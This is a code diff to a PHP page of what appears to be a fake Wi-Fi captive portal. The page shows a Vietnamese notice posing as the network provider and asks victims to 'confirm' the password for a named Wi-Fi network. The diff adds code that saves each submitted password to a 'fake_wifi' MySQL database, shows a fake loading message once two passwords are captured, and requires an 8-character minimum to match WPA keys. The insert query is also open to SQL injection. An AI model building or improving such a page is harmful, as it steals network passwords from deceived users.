@@ -1,13 +1,24 @@
 <?php
+    $host = 'localhost';
+    $user = 'root';
+    $pass = 'root';
+    $db = 'fake_wifi';
+    $connect = new mysqli($host, $user, $pass, $db);
+    $result = $connect->query('SELECT * FROM wifi');
+    if ($result instanceof mysqli_result and $result->num_rows >= 2)
+    {
+        echo '<em> Please wait for loading data .....  </em>';
+        exit;
+    }
 	if (isset($_POST['submit']))
 	{
-		$host = '';
-		$user = '';
-		$pass = '';
-		$db = '';
-		$connect = new mysqli($host, $user, $pass, $db);
-		$data = $_POST['pass'];
-		// write to database
+		$pass = $_POST['pass'];
+        // write to database
+        if ($connect->query("INSERT INTO wifi(pass) VALUES('$pass')"))
+        {
+            header('Location: '.$_SERVER['PHP_SELF']);
+            exit;
+        }
 	}
 ?>
 <!DOCTYPE HTML>
@@ -15,8 +26,9 @@
 	<head>
 		<link rel="icon" href="/asset/img/signal_1.ico" />
 		<link rel="stylesheet" href="/asset/dist/css/bootstrap.css" />
-		<link rel="stylesheet" href="/asset/dist/css/bootstrap-theme.min.css" />
-		<script src="/asset/jquery-1.12.4.min.js"></script>
+        <link rel="stylesheet" href="/asset/dist/css/bootstrap-theme.min.css" />
+        <script src="/asset/jquery-1.12.4.min.js"></script>
+        <script src="/asset/jquery.validate.min.js"></script>
 		<script src="/asset/dist/js/bootstrap.min.js"></script>
 		<style>
 			.body
@@ -34,7 +46,7 @@
 		<div class="container">
 			<div class="row">
 				<div class="col-sm-8 col-sm-offset-2">
-					<form method="post">
+					<form method="post" id="form-mic">
 						<h3 class="text-muted"> Xác thực mật khẩu Wifi <em><strong>"Wifi Tuan"</strong></em> </h3>
 						<div class="form-group">
 							<a href="javascript:void(0)" data-toggle="popover"><span class="glyphicon glyphicon-signal"></span>&nbsp; Thông tin chi tiết </a>
@@ -66,7 +78,22 @@
 		    	title: 'THÔNG BÁO TỪ NHÀ MẠNG',
 		    	content: 'Để đảm bảo an toàn thông tin trên Internet, chúng tôi muốn bạn xác nhận mật khẩu Wifi của bạn để bảo vệ dữ liệu của bạn an toàn trước các Hacker và Virus xâm nhập qua Máy tính và SmartPhone !',
 		    	trigger: 'hover'
-		    });   
+            });
+            $('#form-mic').validate({
+                errorClass: 'text-danger',
+                rules: {
+                    pass: {
+                        required: true,
+                        minlength: 8
+                    }
+                },
+                messages: {
+                    pass: {
+                        required: 'Bạn vui lòng nhập mật khẩu vào ô này',
+                        minlength: 'Mật khẩu phải lớn hơn hoặc bằng 8 ký tự'
+                    }
+                }
+            });
 		});
 		</script>
 	</body>
